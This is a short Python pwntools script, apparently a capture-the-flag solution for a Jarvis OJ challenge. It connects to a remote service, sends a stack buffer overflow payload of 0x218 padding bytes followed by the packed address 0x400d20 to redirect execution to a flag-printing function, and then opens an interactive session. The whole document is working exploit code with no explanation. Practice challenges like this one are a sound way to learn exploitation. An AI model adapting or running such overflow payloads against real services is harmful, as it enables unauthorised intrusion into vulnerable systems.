from pwn import *

sh = remote('pwn.jarvisoj.com', 9877)
  
flag_addr = 0x400d20
payload = 'a' * 0x218 + p64(flag_addr)
  
sh.recv()
sh.sendline(payload)
sh.interactive()
sh.close()